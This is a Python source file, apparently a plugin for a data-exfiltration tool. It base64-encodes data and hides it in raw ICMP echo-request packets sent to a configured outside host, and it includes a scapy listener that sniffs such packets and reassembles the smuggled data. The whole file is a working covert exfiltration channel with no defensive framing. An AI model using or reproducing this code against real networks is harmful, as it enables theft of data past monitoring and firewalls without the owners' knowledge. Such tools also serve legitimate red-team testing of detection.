import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy import all as scapy
import base64
import socket
from struct import pack

config = None
app_exfiltrate = None

# http://wiki.dreamrunner.org/public_html/Python/Python-Things.html
def checksum(source_string):
    sum = 0
    countTo = (len(source_string)/2)*2
    count = 0
    while count<countTo:
        thisVal = ord(source_string[count + 1])*256 + \
                ord(source_string[count])
        sum = sum + thisVal
        #sum = sum & 0xffffffff
        count = count + 2
    if countTo<len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        #sum = sum & 0xffffffff
    sum = (sum >> 16)  +  (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer
# end of copy-paste

def send_icmp(dst, data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        print "root power you must have !"
        sys.exit()
    ip_src = socket.gethostbyname(socket.getfqdn())
    ip_dst = socket.gethostbyname(dst)

    icmp_type = 8
    icmp_code = 0
    icmp_sum  = 0
    icmp_id   = 1
    icmp_seq  = 1

    icmp_hdr = pack('!BBHHH', icmp_type, icmp_code, icmp_sum, icmp_id, icmp_seq)
    icmp_sum = checksum(icmp_hdr + data)
    icmp_hdr = pack('!BBHHH', icmp_type, icmp_code, icmp_sum, icmp_id, icmp_seq)
    packet = icmp_hdr + data
    s.sendto(packet, (ip_dst, 0))
    s.close()

def send(data):
    data = base64.b64encode(data)
    app_exfiltrate.log_message(
        'info', "[icmp] Sending {} bytes with ICMP packet".format(len(data)))
    send_icmp(config['target'], data)

def listen():
    app_exfiltrate.log_message('info', "[icmp] Listening for ICMP packets..")
    # Filter for echo requests only to prevent capturing generated replies
    scapy.sniff(filter="icmp and icmp[0]=8", prn=analyze)


def analyze(packet):
    src = packet.payload.src
    dst = packet.payload.dst
    try:
        app_exfiltrate.log_message(
            'info', "[icmp] Received ICMP packet from: {0} to {1}".format(src, dst))
        app_exfiltrate.retrieve_data(base64.b64decode(packet.load))
    except:
        pass


class Plugin:
    def __init__(self, app, conf):
        global app_exfiltrate, config
        app_exfiltrate = app
        config = conf
        app.register_plugin('icmp', {'send': send, 'listen': listen})
